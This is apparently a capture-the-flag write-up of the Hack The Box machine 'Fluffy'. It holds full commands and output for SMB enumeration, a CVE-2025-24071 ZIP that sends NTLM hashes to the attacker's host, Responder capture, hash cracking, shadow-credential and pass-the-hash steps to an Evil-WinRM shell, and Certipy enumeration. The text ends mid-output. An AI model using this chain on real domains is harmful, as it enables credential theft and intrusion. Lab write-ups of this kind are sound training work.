---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - Pass-The-Certificate
  - Pass-The-Hash
  - ESC-16
  - Certipy
---
# Overview

| Name        | Fluffy    |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman / J0elTHEM4n1990!`
# Recon
## Nmap 

```bash
~/Hentai/HTB/fluffy 7m 37s ❯ sudo nmap -sC -sV -vv 10.10.11.69 -oN fluffy-output
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-14 12:01 +0545
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:01
Completed NSE at 12:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:01
Completed NSE at 12:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:01
Completed NSE at 12:01, 0.00s elapsed
Initiating Ping Scan at 12:01
Scanning 10.10.11.69 [4 ports]
Completed Ping Scan at 12:01, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:01
Completed Parallel DNS resolution of 1 host. at 12:01, 0.01s elapsed
Initiating SYN Stealth Scan at 12:01
Scanning 10.10.11.69 [1000 ports]
Discovered open port 53/tcp on 10.10.11.69
Discovered open port 445/tcp on 10.10.11.69
Discovered open port 139/tcp on 10.10.11.69
Discovered open port 88/tcp on 10.10.11.69
Discovered open port 389/tcp on 10.10.11.69
Discovered open port 593/tcp on 10.10.11.69
Discovered open port 636/tcp on 10.10.11.69
Discovered open port 3269/tcp on 10.10.11.69
Discovered open port 464/tcp on 10.10.11.69
Discovered open port 3268/tcp on 10.10.11.69

Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-14 13:16:36Z)
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy

445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy

3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb

3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-14T13:18:03+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 53865/tcp): CLEAN (Timeout)
|   Check 2 (port 57188/tcp): CLEAN (Timeout)
|   Check 3 (port 5751/udp): CLEAN (Timeout)
|   Check 4 (port 46594/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-06-14T13:17:24
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.95 seconds
           Raw packets sent: 2000 (87.976KB) | Rcvd: 17 (732B)
```

## Host file

```bash
~/Hentai/HTB/fluffy 8s ❯ sudo tail -4 /etc/hosts
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.69 fluffy.htb DC01.fluffy.htb
```
# Enumeration
## SMB (445) Open

```bash
~/Hentai/HTB/fluffy ❯ smbclient -L //dc01.fluffy.htb -U j.fleischman%J0elTHEM4n1990!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

- Only Interesting one is `IT`.
## IT SHARES

```bash

~/Hentai/HTB/fluffy ❯ smbclient //dc01.fluffy.htb/IT -U j.fleischman%J0elTHEM4n1990!

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 14 18:59:51 2025
  ..                                  D        0  Sat Jun 14 18:59:51 2025
  a.library-ms                        A      365  Sat Jun 14 19:07:59 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 20:53:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 20:49:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 20:53:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 20:48:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 20:16:07 2025

                5842943 blocks of size 4096. 2073893 blocks available
smb: \>
```

- Since other are executables Only downloaded `Upgrade_Notice.pdf` and `a.library-ms`.

```bash
~/Hentai/HTB/fluffy ❯ cat a.library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.21\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

- Seems useless.
## Upgrade_Notice.pdf

![[fluffy.png]]

- Seems like Company has CVE & Hasn't upgraded.
- First CVE doesnt seem to have much information online but on second CVE I found this [github](https://github.com/ThemeHackers/CVE-2025-24071)
## CVE -2025-24071

 - It says:

```
## Overview

[](https://github.com/ThemeHackers/CVE-2025-24071#overview)

NSFOCUS CERT has detected that Microsoft recently released a security update to address a critical spoofing vulnerability in Windows File Explorer, identified as **CVE-2025-24071**. This vulnerability has a CVSS score of 7.5, indicating its severity. The issue arises from the implicit trust and automatic file parsing behavior of `.library-ms` files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat. Affected users are strongly advised to apply the patch immediately to mitigate the risk.
```

- Hm. We found `.library-ms` from SMB.
- Asked [GPT](https://chatgpt.com/c/684d1337-3e58-8000-8c28-88da36e9bc26)
## Confirming If we can PUT in IT Share

- To use reponder to get NTLM hash we first need to have write permission in shares.

```bash
~/Hentai/HTB/fluffy/CVE-2025-24071 main* CVE-2025-24071 ❯ touch hi.txt

~/Hentai/HTB/fluffy/CVE-2025-24071 main* CVE-2025-24071 ❯ smbclient //dc01.fluffy.htb/IT -U j.fleischman%J0elTHEM4n1990!

Try "help" to get a list of possible commands.
smb: \> put hi.txt
putting file hi.txt as \hi.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \>
```

- We can write in share.
# Exploitation

## Making Evil ZIP to get NTLM Hash

```bash
~/Hentai/HTB/fluffy/CVE-2025-24071 main* CVE-2025-24071 ❯ ip a
<SNIP>
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.10.14.65/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::103f/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::d17b:dbd:b40:dcd8/64 scope link stable-privacy
       valid_lft forever preferred_lft forever

~/Hentai/HTB/fluffy/CVE-2025-24071 main* CVE-2025-24071 ❯ python3 exploit.py -i 10.10.14.65 -f evil.library-ms

                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                   

Creating exploit with filename: evil.library-ms.library-ms
Target IP: 10.10.14.65

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.

~/Hentai/HTB/fluffy/CVE-2025-24071 main* CVE-2025-24071 ❯ ls
env  exploit.py  exploit.zip  hi.txt  LICENSE  README.md  requirements.txt
```

## Running Responder Simultaneosly in Another Tab to get NTML Hash


```bash

~/Hentai/HTB/fluffy/Responder master* Responder ❯ sudo /home/at0m/Hentai/HTB/fluffy/CVE-2025-24071/env/bin/python Responder.py -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[*] Sponsor Responder: https://paypal.me/PythonResponder

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.65]
    Responder IPv6             [dead:beef:2::103f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-OINHJ54Y4RS]
    Responder Domain Name      [YYNC.LOCAL]
    Responder DCE-RPC Port     [45358]

[*] Version: Responder 3.1.6.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...
```
## Putting Evil ZIP in Shares.

```bash
~/Hentai/HTB/fluffy/CVE-2025-24071 main* CVE-2025-24071 ❯ smbclient //dc01.fluffy.htb/IT -U j.fleischman%J0elTHEM4n1990!

Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.3 kb/s) (average 0.3 kb/s)
smb: \> dir
  .                                   D        0  Sat Jun 14 19:41:52 2025
  ..                                  D        0  Sat Jun 14 19:41:52 2025
  a.library-ms                        A      365  Sat Jun 14 19:07:59 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 20:53:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 20:49:05 2025
  exploit.zip                         A      338  Sat Jun 14 19:41:52 2025
  hi.txt                              A        0  Sat Jun 14 19:28:39 2025
  KeePass-2.58                        D        0  Fri Apr 18 20:53:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 20:48:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 20:16:07 2025

                5842943 blocks of size 4096. 2073089 blocks available
smb: \>
```
## Waiting In Responder To get Hash

- Wait few seconds.

```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:39ccaf3a91ec12c4:7543088B7FA1775FBF3170BBB0041EF9:01010000000000000030C0FE28DDDB01C5C5BBDAC3898BCE0000000002000800590059004E00430001001E00570049004E002D004F0049004E0048004A0035003400590034005200530004003400570049004E002D004F0049004E0048004A003500340059003400520053002E00590059004E0043002E004C004F00430041004C0003001400590059004E0043002E004C004F00430041004C0005001400590059004E0043002E004C004F00430041004C00070008000030C0FE28DDDB0106000400020000000800300030000000000000000100000000200000376F42AA1285B9A5C22982C97320A54E7C9FAD8D10B13E8C513ABE2CD55740720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
```
## Cracking Hashes of `p.agila`

```bash
~/Hentai/HTB/fluffy/CVE-2025-24071 main* CVE-2025-24071 ❯ cat hash.txt
p.agila::FLUFFY:39ccaf3a91ec12c4:7543088B7FA1775FBF3170BBB0041EF9:01010000000000000030C0FE28DDDB01C5C5BBDAC3898BCE0000000002000800590059004E00430001001E00570049004E002D004F0049004E0048004A0035003400590034005200530004003400570049004E002D004F0049004E0048004A003500340059003400520053002E00590059004E0043002E004C004F00430041004C0003001400590059004E0043002E004C004F00430041004C0005001400590059004E0043002E004C004F00430041004C00070008000030C0FE28DDDB0106000400020000000800300030000000000000000100000000200000376F42AA1285B9A5C22982C97320A54E7C9FAD8D10B13E8C513ABE2CD55740720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000
```
## John The Ripper

```bash
└──╼ [★]$ john hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt

Created directory: /home/htb-ac-1518820/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:01 DONE (2025-06-14 02:06) 0.5263g/s 2377Kp/s 2377Kc/s 2377KC/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

- We got the password for `p.agila` which is `prometheusx-303`.
## Bloodhound

- [Bloodhound](https://github.com/dirkjanm/BloodHound.py))

```bash
~/Hentai/HTB/fluffy/BloodHound.py master 7h 0m 1s pywhisker ❯ python3 bloodhound.py -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.10.11.69 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
ERROR: Unhandled exception in computer DC01.fluffy.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/home/at0m/Hentai/HTB/fluffy/pywhisker/env/lib/python3.12/site-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
<SNIP>
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 00M 41S
INFO: Compressing output into 20250616202152_bloodhound.zip
```

- Messy but we seem to have gotten something in `.zip`.
## BloodHound GUI

- Follow [Github](https://gist.github.com/vestjoe/68b579d07f6a685b15d05f55908883cc) Instructions then go to `site` login and upload the zip file `20250616202152_bloodhound.zip`

![[blood.png]]

- `P.agilla` is member of `Service Account Manager`.

![[blods.png]]

- `Service Account Manager` has `Generic All` (This permission allows the user or group to **take full control** over the target object (usually a user or computer account)) relationship to `Service Accounts`.

![[blodss.png]]

- And `Service Accounts` has `GenericWrite`(With **GenericWrite**, you can change some parts of the account—like adding it to a group or changing some attributes, but you can't fully control or take over the account like with GenericAll.) to 3 Accounts I chose `WINRM_SVC` in that.

![[blodsilike.png]]

- Now Finally this is the whole Map.
#### Summary

The user **p.agila** is member of **SERVICE ACCOUNT MANAGERS** and this group has **GenericAll** to the **SERVICE ACCOUNTS** group and then **SERVICE ACCOUNTS** has **GenericWrite** relationship to **ca_svc**, **ldap_svc** and **winrm_svc** accounts.  
With the **GenericAll** relationship we can directly modify the group members so we can add **p.agila** to **SERVICE ACCOUNTS** and after that we can do a **Shadow Credential attack** to any of the previous mentioned accounts.
## Adding `P.Agilla` to Service Accounts.

```bash
master* ❯ net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```
## Shadow Credentials

### Pass the Certificate

- Reference: [[Password Attacks]]
### Making X.509 certificate to obtain TGT and NT Hash.
#### Using `pywhisker.py` to add `p.agila` to the access control list (ACL) of `winrm_svc`

```bash
~/Hentai/HTB/fluffy/pywhisker/pywhisker main* pywhisker ❯ python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"

[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 
18e8482b-97cd-fe5d-cb29-5a6e833846a6
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: RsWeZjev.pfx
[+] PFX exportiert nach: RsWeZjev.pfx
[i] Passwort für PFX: 4QdYa1JOlN65ml8sJJyu
[+] Saved PFX (#PKCS12) certificate & key at path: RsWeZjev.pfx
[*] Must be used with password: 4QdYa1JOlN65ml8sJJyu
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

- We got `RsWeZjev.pfx` and key `4QdYa1JOlN65ml8sJJyu` to generate TGT using PKINITTools .
- A `.pfx` file (also known as **PKCS#12** or **Personal Information Exchange** format) is a binary format that **bundles a certificate and its corresponding private key** — often used to authenticate a user or machine.

```bash
~/Hentai/HTB/fluffy/pywhisker/pywhisker main* 6s pywhisker ❯ ls
__init__.py   RsWeZjev_cert.pem  RsWeZjev_priv.pem
pywhisker.py  RsWeZjev.pfx
```
#### PKINITTools

- We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `winrm_svc`. 
##### Install PKINITTools

```bash
At0mXploit@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
At0mXploit@htb[/htb]$ python3 -m venv .venv
At0mXploit@htb[/htb]$ source .venv/bin/activate
At0mXploit@htb[/htb]$ pip3 install -r requirements.txt

# Fuck do this or error
pip install git+https://github.com/wbond/oscrypto.git@1547f535001ba568b239b8797465536759c742a3 --force
```
##### TGT

```bash
~/Hentai/HTB/fluffy/PKINITtools master pywhisker ❯ python3 gettgtpkinit.py -cert-pfx ~/Hentai/HTB/fluffy/pywhisker/pywhisker/RsWeZjev.pfx -pfx-pass 4QdYa1JOlN65ml8sJJyu fluffy.htb/winrm_svc winrm_svc.ccache

2025-06-16 21:45:23,832 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-16 21:45:23,922 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/home/at0m/Hentai/HTB/fluffy/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
  File "/home/at0m/Hentai/HTB/fluffy/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
  File "/home/at0m/Hentai/HTB/fluffy/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
          ^^^^^^^^^^^^^^^^^^
  File "/home/at0m/Hentai/HTB/fluffy/pywhisker/env/lib/python3.12/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great" 
```

**Note: Kerberos is very sensitive to time differences — the default tolerance is usually 5 minutes. If your system is ahead or behind the DC by more than that, authentication fails like above.**
##### Fixing Time Sensitivity

- Read from [here](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069) to fix.

```bash
~/Hentai/HTB/fluffy/PKINITtools master pywhisker ❯ timedatectl set-ntp off

~/Hentai/HTB/fluffy/PKINITtools master 8s pywhisker ❯ sudo rdate -n 10.10.11.69
Mon Jun 16 23:08:23 UTC 2025

~/Hentai/HTB/fluffy/PKINITtools master 7h 0m 9s pywhisker ❯ python3 gettgtpkinit.py -cert-pfx ~/Hentai/HTB/fluffy/pywhisker/pywhisker/RsWeZjev.pfx -pfx-pass 4QdYa1JOlN65ml8sJJyu fluffy.htb/winrm_svc winrm_svc.ccache

2025-06-16 23:08:28,509 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-16 23:08:28,635 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-16 23:08:35,164 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-16 23:08:35,164 minikerberos INFO     9d38cd84e881a213f84e1d9dd8b48e1e38f52e35bcd7687de2d72dd229a0a104
INFO:minikerberos:9d38cd84e881a213f84e1d9dd8b48e1e38f52e35bcd7687de2d72dd229a0a104
2025-06-16 23:08:35,206 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

- We got the `AS-REP encryption key` now we can get `NT` hashes from it to perform `Pass The Hash` Attack.

```bash
~/Hentai/HTB/fluffy/PKINITtools master 7s pywhisker ❯ ls
getnthash.py     gettgtpkinit.py  ntlmrelayx  requirements.txt
gets4uticket.py  LICENSE          README.md   winrm_svc.ccache

~/Hentai/HTB/fluffy/PKINITtools master pywhisker ❯ export KRB5CCNAME=winrm_svc.ccache
```
##### Extracting Hashes 

```bash
~/Hentai/HTB/fluffy/PKINITtools master* pywhisker ❯ python3 getnthash.py -key 9d38cd84e881a213f84e1d9dd8b48e1e38f52e35bcd7687de2d72dd229a0a104 fluffy.htb/winrm_svc

/home/at0m/Hentai/HTB/fluffy/pywhisker/env/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
33bd09dcd697600edf6b3a7af4875767
```

- We got the `NT` Hash `33bd09dcd697600edf6b3a7af4875767` now we can perform `PTH`.
## Pass The Hash

```bash
~/Hentai/HTB/fluffy/PKINITtools master* pywhisker ❯ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

- And We are In.
## User Flag

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> dir ../Desktop


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/16/2025   2:02 PM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
93f2c0e9d543156616ecf3acb10d5e15
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> 
```

# Privilege Escalation

References: [Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
## Trying to find Vulnerabilities using Certipy 
### In User `winrm_svc` (Fail)

```bash

~/Hentai/HTB/fluffy 43s certipy-venv ❯ certipy find -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 -dc-ip 10.10.11.69        

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250617053904_Certipy.txt'
[*] Wrote text output to '20250617053904_Certipy.txt'
[*] Saving JSON output to '20250617053904_Certipy.json'
[*] Wrote JSON output to '20250617053904_Certipy.json'

~/Hentai/HTB/fluffy 48s certipy-venv ❯ cat 20250617053904_Certipy.txt | grep -i "Vulnerabilities"
```

- We got nothing now lets try in another users  of `Service Accounts` which is `ca_svc` and `ldap_svc`.
### In User `ca_svc` (Success)
#### Getting Hashes First of `ca_svc`

- To test the vulnerabilities we will need to get `NT` hash like with `winrm_svc`, Just repeat the steps as we used in `winrm_svc`.

```bash
python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
```

- Fix Time Sensitivity like before.

```bash
python3 gettgtpkinit.py -cert-pfx ~/Hentai/HTB/fluffy/pywhisker/pywhisker/D6VmLpOd.pfx -pfx-pass No31cZ0B3NDC9xf4s3PU fluffy.htb/ca_svc ca_svc.ccache
```

```bash
 export KRB5CCNAME=ca_svc.ccache   
```

```bash
python3 getnthash.py -key 1f97f454334b414944878d1d63de387b045b2f8c852828cbe61488afef394cd2 fluffy.htb/ca_svc   
```

- After this, we get NT Hash of `ca_svc` which is `ca0f4f9e9eb8a092addf53bb03fc98c8`
#### Testing Vulnerabitility using Certipy

```bash
~/Hentai/HTB/fluffy certipy-venv ❯ certipy find -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250617125639_Certipy.txt'
[*] Wrote text output to '20250617125639_Certipy.txt'
[*] Saving JSON output to '20250617125639_Certipy.json'
[*] Wrote JSON output to '20250617125639_Certipy.json'

~/Hentai/HTB/fluffy 42s certipy-venv ❯ cat 20250617125639_Certipy.txt | grep -i "Vulnerabilities"
    [!] Vulnerabilities
```

- We got `Vulnerabilities` lets check what is it.

```bash
~/Hentai/HTB/fluffy certipy-venv ❯ cat 20250617125639_Certipy.txt | grep -i -C 15 "Vulnerabilities"

    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
